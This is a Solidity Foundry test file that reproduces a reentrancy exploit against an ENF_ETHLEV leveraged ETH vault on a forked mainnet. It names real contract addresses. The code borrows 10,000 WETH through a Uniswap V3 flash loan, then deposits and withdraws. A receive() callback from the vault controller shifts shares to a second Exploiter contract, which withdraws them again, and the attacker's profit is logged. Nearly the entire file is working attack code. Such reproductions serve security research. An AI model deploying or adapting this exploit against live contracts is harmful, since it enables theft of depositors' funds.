// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

interface IENF_ETHLEV is IERC20 {
    function deposit(uint256 assets, address receiver) external payable returns(uint256);
    function withdraw(uint256 assets, address receiver) external returns(uint256);
    function convertToAssets(uint256 shares) external view returns(uint256);
    function totalAssets() external view returns(uint256);
}

/**
 * Contract address: 0xfe141c32e36ba7601d128f0c39dedbe0f6abb983
 */
contract ContractTest is Test {
    IWFTM WETH = IWFTM(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    Uni_Pair_V3 Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);
    address Controller = 0xE8688D014194fd5d7acC3c17477fD6db62aDdeE9;
    Exploiter exploiter;

    function setUp() public {
        vm.createSelectFork("mainnet", 17875885); // replace the mainnet with your rpc_url
    }

    function testExploit() external {
        deal(address(this), 0);
        emit log_named_decimal_uint(
            "[*] Attacker WETH balance before exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );

        exploiter =  new Exploiter();
        emit log_string("==================== Start of attack ====================");
        Pair.flash(address(this), 0, 10_000 ether, abi.encode(10_000 ether));
        emit log_string("==================== End of attack ====================");
        emit log_named_decimal_uint(
            "[*] Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()
        );
    }

    /**
     * Override the flash callback with our custom logic to execute the desired swaps and pay the profits to the original msg.sender.
     */
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        emit log_named_decimal_uint('[*] fee1', fee1, 18);

        WETH.withdraw(WETH.balanceOf(address(this)));
        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint).max);
        uint256 assets = ENF_ETHLEV.totalAssets();
        emit log_named_decimal_uint("[*] Attacker's ether balance at the start", address(this).balance, 18);

        ENF_ETHLEV.deposit{value: assets}(assets, address(this)); 
        emit log_named_decimal_uint("[*] Attacker's ether balance after deposit", address(this).balance, 18);
        emit log_named_decimal_uint("[*] Attacker's LP share after deposit", ENF_ETHLEV.balanceOf(address(this)), ENF_ETHLEV.decimals());

        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));
        ENF_ETHLEV.withdraw(assetsAmount, address(this)); 
        emit log_named_decimal_uint("[*] Attacker's LP share after withdrawing", ENF_ETHLEV.balanceOf(address(this)), ENF_ETHLEV.decimals());
        emit log_named_decimal_uint("[*] Attacker ether balance after withdrawing", address(this).balance, 18);

        exploiter.withdraw(); 

        WETH.deposit{value: address(this).balance}();
        emit log_named_decimal_uint("[*] Attacker's total WETH after attack", WETH.balanceOf(address(this)), WETH.decimals());

        uint256 amount = abi.decode(data, (uint256));
        WETH.transfer(address(Pair), fee1 + amount); 
        emit log_named_decimal_uint("[*] Attacker's total WETH after payback flashloan", WETH.balanceOf(address(this)), WETH.decimals());
    }       

    receive() external payable {
        if (msg.sender == Controller) {
            ENF_ETHLEV.transfer(address(exploiter), ENF_ETHLEV.balanceOf(address(this)));
        }
       
    }

}

/**
 * Contract address: 0xcfd26fe5fe6028539802275c1cc6e9325aa2e3b7
 */
contract Exploiter {
    IENF_ETHLEV ENF_ETHLEV = IENF_ETHLEV(0x5655c442227371267c165101048E4838a762675d);
    function withdraw() external {
        ENF_ETHLEV.approve(address(ENF_ETHLEV), type(uint).max);
        uint256 assetsAmount = ENF_ETHLEV.convertToAssets(ENF_ETHLEV.balanceOf(address(this)));
        ENF_ETHLEV.withdraw(assetsAmount, address(this));
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {}
}